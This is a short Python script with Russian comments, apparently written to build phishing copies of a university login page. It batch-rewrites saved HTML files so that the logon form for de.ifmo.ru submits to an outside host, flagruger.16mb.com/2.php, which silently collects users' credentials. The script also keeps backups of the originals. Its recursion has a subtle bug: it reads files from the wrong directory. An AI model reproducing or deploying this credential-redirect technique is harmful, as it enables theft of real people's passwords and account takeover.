# -*- coding: UTF-8 -*-

# by FlagRuger

from os import listdir
import os
import time
import re

# Настройки
dirname = "!new"  	#папка с новыми файлами 
backdir = "!old"	#папка с бекапом файлов
format = ".html"	#какие документы изменяем (например, ".html")
old = "id=\"logonForm\" action=\"https://de.ifmo.ru/servlet/\""        #что меняем   (не забываем про экранирование кавычек обратным слешем)
new = "id=\"logonForm2\" action=\"http://flagruger.16mb.com/2.php/\""  #на что меняем  (при необходимости можно прогнать несколько раз)

print("\n[!] Старт\n")

curdir = os.path.abspath(os.curdir)
lenn = len(curdir)

#Проход папки

def run(directory):
	
	print(" [d] " + directory)
	
	#Список папок
	for root, dirnames, filenames in os.walk(directory):
		break;
	
	files = listdir(directory)
	myfiles = filter(lambda x: x.endswith(format), files)
	
	dirr = curdir + "\\" + dirname + "\\" + directory[lenn:] + "\\"
	backupdir = curdir + "\\" + backdir + "\\" + directory[lenn:] + "\\"
	
	if not os.path.exists(dirr):
		os.mkdir(dirr)

	if not os.path.exists(backupdir):
		os.mkdir(backupdir)
	
	for i in myfiles:
		print("  [+] " + i)
		output_file = open(dirr + i, "w")
		output_file_backup = open(backupdir + i, "w")
		data = open(i).read()
		output_file_backup.write(data)
		output_file.write( re.sub(old, new, data)  )
		output_file.close()
		output_file_backup.close()
		
	for j in dirnames:
		print("   [#] " + directory + "\\" + j)
		#run(directory + "\\" + j)
		
	for j in dirnames:
		if (not j == "!new") and (not j == "!old"):
			print("\n")
			run(directory + "\\" + j)

		
run(curdir)

print("\n[!] Готово\n")